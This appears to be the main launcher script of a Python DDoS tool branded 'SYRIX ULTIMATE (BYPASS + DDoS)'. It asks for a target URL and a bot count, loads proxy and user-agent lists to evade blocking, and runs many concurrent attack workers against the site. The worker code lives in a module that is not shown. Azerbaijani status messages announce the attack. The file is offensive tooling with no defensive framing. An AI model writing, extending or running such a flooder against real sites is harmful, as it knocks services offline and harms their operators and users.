import asyncio
import os
import sys
import time
from colorama import Fore, Style, init
from core.engine import attack_worker

init(autoreset=True)

def print_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(rf"""
{Fore.RED}{Style.BRIGHT}
  ██████╗██╗   ██╗██████╗ ██╗██╗  ██╗
 ██╔════╝╚██╗ ██╔╝██╔══██╗██║╚██╗██╔╝
 ╚█████╗  ╚████╔╝ ██████╔╝██║ ╚███╔╝ 
  ╚═══██╗  ╚██╔╝  ██╔══██╗██║ ██╔██╗ 
 ██████╔╝   ██║   ██║  ██║██║██╔╝ ██╗
 ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝
{Fore.WHITE}──────────────────────────────────────────
{Fore.CYAN}   [+] SYRIX ULTIMATE (BYPASS + DDoS) [+]
{Fore.WHITE}──────────────────────────────────────────
    """)

def load_data(file_path):
    if os.path.exists(file_path):
        with open(file_path, "r") as f:
            return [line.strip() for line in f if line.strip()]
    return []

async def main():
    print_banner()
    
    target = input(f"{Fore.RED}[?]{Fore.WHITE} Target URL: ").strip()
    if not target.startswith("http"): target = "http://" + target
    
    try:
        threads = int(input(f"{Fore.RED}[?]{Fore.WHITE} Threads (Bots): "))
    except:
        threads = 100

    proxies = load_data("data/proxies.txt")
    uas = load_data("data/ua.txt")

    if not uas:
        uas = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"]

    print(f"\n{Fore.GREEN}[*] Data yükləndi. Hücum başladılır...")
    time.sleep(2)

    semaphore = asyncio.Semaphore(threads)
    
    # Düzgün arqument ötürülməsi (target, uas, proxies, semaphore)
    tasks = [attack_worker(target, uas, proxies, semaphore) for _ in range(threads)]
    
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Dayandırıldı.")
        sys.exit()
